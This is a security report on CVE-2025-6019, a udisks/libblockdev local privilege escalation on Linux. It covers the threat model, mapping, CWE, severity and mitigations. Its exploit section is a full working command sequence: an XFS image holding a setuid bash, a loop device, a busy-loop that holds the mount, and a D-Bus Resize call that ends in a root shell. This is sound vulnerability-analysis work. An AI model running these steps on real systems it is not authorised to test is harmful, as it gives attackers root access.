# Cybersecurity Report on a Recent udisks2 Vulnerability on Linux

This report concerns the vulnerability identified by CVE-2025-6019 [^1] and the proof of concept provided by Qualys to exploit it [^2].

## The Threat Model

The attacker needs to be able to log-in locally on the target Linux system (i.e. has to be physically present in front of the computer) with any valid account for which the Polkit "allow\_active" policy is enabled. The attacker also needs to be able to copy files to the target machine, either locally or through the network. The target machine needs to run the Linux kernel, use Polkit for security policy enforcement, and the udisks daemon to manage storage devices.

## The Main Idea

A user that is physically logged into a Linux machine is given some additional privileges as opposed to a user logged in remotely. One of these privileges is granted by Polkit and it concerns the udisks daemon. Such a user can set up a loop device that is backed by an arbitrary filesystem image and it can mount it without being root. Given that the user has the ability to mount any self-provided filesystem, the udisks daemon mounts it with the *nosuid* and *nodev* flags to prevent execution of suid-enabled binaries inside the filesystem, and so that device files (like */dev/mem* or */dev/sda*) cannot be used to access sensitive system resources.

The idea of this exploit is to find a way to trick the udisks daemon into mounting a user-provided filesystem without enabling the *nosuid* and *nodev* flags.

## The Exploit

Since 2017, the udisks daemon allows an "allow\_active" user to resize filesystems. In particular, when resizing an XFS filesystem, udisks calls libblockdev (a library for low-level block devices manipulation), which temporarily mounts this XFS filesystem in */tmp* ***without*** enabling the *nosuid* and *nodev* flags. This allows the attacker to create an XFS image on their own machine and store inside a suid-enabled binary. After doing so, the attacker can copy the image to the target machine, resize it, mount it, and execute the suid-enabled payload stored inside */tmp*, thus obtaining root privileges.

## A Possible Attack

### Our set-up:

Even though this vulnerability has been discovered quite recently and many Linux distributions still haven't patched it at the time of writing this report, we will be using an older Ubuntu 22.04 LTS installation to make sure the bug hasn't been fixed. The O.S. will be ran on a virtual machine and, for convenience purposes, the attacker and the victim will operate on the same installation.

### On the attacker machine:

We log in as root and after that we create an empty 300MiB XFS image:

```
root# dd if=/dev/zero of=./xfs.image bs=1M count=300
root# mkfs.xfs ./xfs.image
```

Then we mount it:

```
root# mkdir ./xfs.mount
root# mount -t xfs ./xfs.image ./xfs.mount
```

And we copy the Bash shell executable inside and enable the setuid bit:

```
root# cp /bin/bash ./xfs.mount
root# chmod 04555 ./xfs.mount/bash
root# umount ./xfs.mount
```

At this point we can copy the image to the target machine however we want. Since in this case we are operating on the same machine, we can simply copy the image to /home/victim and change its ownership:

```
root# cp ./xfs.image /home/victim
root# chown /home/victim/xfs.image victim
root# chgrp /home/victim/xfs.image victim
```

### On the target machine:

We log into the target machine using our valid account (*victim*) and we check if the "allow\_active" policy is enabled:

```
victim$ gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
('yes',)
```

![Logged in as unprivileged account](/images/screen_normal.jpg)

We set up a loop device based on our XFS image, but we first have to make sure that "gvfs-udisks2-volume-monitor" is not running as our user. This daemon would automatically mount the filesystem, whereas we want libblockdev to do it instead:

```
victim$ killall -KILL gvfs-udisks2-volume-monitor

victim$ udisksctl loop-setup --file ./xfs.image --no-user-interaction
Mapped file ./xfs.image as /dev/loop0.
```

Before asking the udisks daemon to resize our XFS filesystem, we want to make sure the mounted filesystem will be kept busy. This is done because libblockdev is only supposed to *temporarily* mount the filesystem to */tmp*, so we need to stop it from unmounting it. The following command loop will do this for us:

```
victim$ while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break; done 2>/dev/null &
```

Now we can mount the filesystem through udisks:

```
victim$ gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem on /dev/loop0: Failed to unmount '/dev/loop0' after resizing it: target is busy
-r-sr-xr-x. 1 root root 1406608 May 13 09:42 /tmp/blockdev.RSM842/bash
```

Finally, we execute the suid-flagged root shell from our XFS filesystem in */tmp* and therefore obtain full root privileges:

```
victim$ mount
...
/dev/loop0 on /tmp/blockdev.RSM842 type xfs (rw,relatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)

victim$ /tmp/blockdev*/bash -p

root# id
uid=65534(victim) gid=65534(victim) euid=0(root) groups=65534(victim)
```

![Executing as root](/images/screen_root.jpg)

## Vulnerability Assessment

### MITRE ATT\&CK Mapping

This vulnerability is a case of LPE, Local Privilege Escalation. On order to exploit it, we make use of a common daemon running on Linux to perform a few tasks with an unnecessary high level of privilege. An appropriate mapping to the MITRE ATT\&CK framework might be categorizing it as a Exploitation for Privilege Escalation technique [^3].

### CWE Classification

The common weakness found to be responsible for this vulnerability is CWE-250: Execution with Unnecessary Privileges [^4]. To quote the website: *"The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses".*

### CVSS Evaluation

This vulnerability has been deemed of High severity. The proper reasons are not given, but we can speculate that it's because of the fact that not only does this vulnerability allow any "reasonably privileged" user the ability to elevate itself to root, but it also only requires very common O.S. utilities to be present on the target system. Still, it needs the account to be a valid one and to be logged in locally to the target machine, but there are ways [^2] to enable the "allow\_active" policy even for remotely logged users, making this attack even more dangerous and automatable.

### Mitigations

A fix [^5] has already been made available which tells libblockdev to mount the filesystem to /tmp with the *nosuid* and *nodev* flags enabled, as it should. In the impossibility of patching the software, a last resort mitigation [^6] can be to modify the Polkit policy and only allow system accounts to mount filesystems.

### Diclosure

LLMs were used in the writing of this report to better understand some of the commands present in the PoC.



[^1]: (https://www.cve.org/CVERecord?id=CVE-2025-6019)

[^2]: (https://cdn2.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt)

[^3]: (https://attack.mitre.org/techniques/T1068/)

[^4]: (https://cwe.mitre.org/data/definitions/250.html)

[^5]: (https://github.com/storaged-project/libblockdev/commit/46b54414f66e965e3c37f8f51e621f96258ae22e)

[^6]: (https://ubuntu.com/blog/udisks-libblockdev-lpe-vulnerability-fixes-available)
